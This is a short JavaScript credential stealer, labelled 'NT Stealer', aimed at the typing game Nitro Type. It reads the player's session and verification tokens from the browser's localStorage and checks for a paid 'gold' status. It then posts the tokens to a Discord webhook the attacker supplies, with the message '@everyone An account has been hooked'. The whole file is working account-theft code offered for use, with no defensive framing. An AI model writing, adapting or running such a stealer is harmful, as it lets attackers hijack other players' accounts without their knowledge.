// Grabs details that verifys logins
var Token = window.localStorage.getItem('player_token');
var VerificationToken = window.localStorage.getItem('persist:nt')
let gold;


if (VerificationToken.includes("gold") == true) {
  console.log('This account has Nitro Type gold')
  gold = 'This account does have gold'
} else {
  console.log('Standard account detected')
  gold = 'This account does not have gold'
}

// Fetching the webhook & sending its details >:)
fetch(
    'YOUR WEBHOOK HERE', // Place in your Discord Webhook here for it to send
    {
      method: 'post',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(
        {
          "content": "@everyone An account has been hooked 😈",
          "embeds": [
            {
              "title": "Account Details",
              "color": null,
              "fields": [
                {
                  "name": "Has gold?",
                  "value": gold
                },
                {
                  "name": "Verification Token",
                  "value": VerificationToken
                },
                {
                  "name": "Main Token",
                  "value": Token
                }
              ],
              "author": {
                "name": "NT Stealer"
              },
              "footer": {
                "text": "Developed by sch144!"
              }
            }
          ]
        }
    )
  }
)
